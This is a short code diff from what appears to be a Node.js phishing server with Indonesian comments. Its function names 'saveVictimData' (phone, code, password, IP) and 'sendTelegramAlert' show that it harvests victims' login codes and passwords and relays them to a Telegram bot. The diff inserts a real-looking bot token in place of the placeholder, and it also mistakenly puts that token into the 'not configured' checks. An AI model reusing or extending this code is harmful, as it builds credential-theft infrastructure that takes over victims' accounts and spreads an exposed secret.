@@ -20,7 +20,7 @@ const PORT = process.env.PORT || 3000;
 // ============================================
 const CONFIG = {
     // Telegram Bot Configuration
-    BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE', // Ganti dengan bot tokenmu
+    BOT_TOKEN: '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s', // Ganti dengan bot tokenmu
     CHAT_ID: 'YOUR_CHAT_ID_HERE',     // Ganti dengan chat IDmu
     
     // Admin credentials
@@ -74,7 +74,7 @@ function initializeDirectories() {
 
 // Initialize Telegram Bot
 function initializeTelegramBot() {
-    if (!CONFIG.BOT_TOKEN || CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+    if (!CONFIG.BOT_TOKEN || CONFIG.BOT_TOKEN === '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
         console.log('⚠️  Telegram bot token not configured. Alerts disabled.');
         return null;
     }
@@ -153,7 +153,7 @@ function saveVictimData(phone, code, password = null, ip, userAgent) {
 }
 
 function sendTelegramAlert(victimData) {
-    if (!CONFIG.BOT_TOKEN || CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+    if (!CONFIG.BOT_TOKEN || CONFIG.BOT_TOKEN === '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
         return;
     }
     
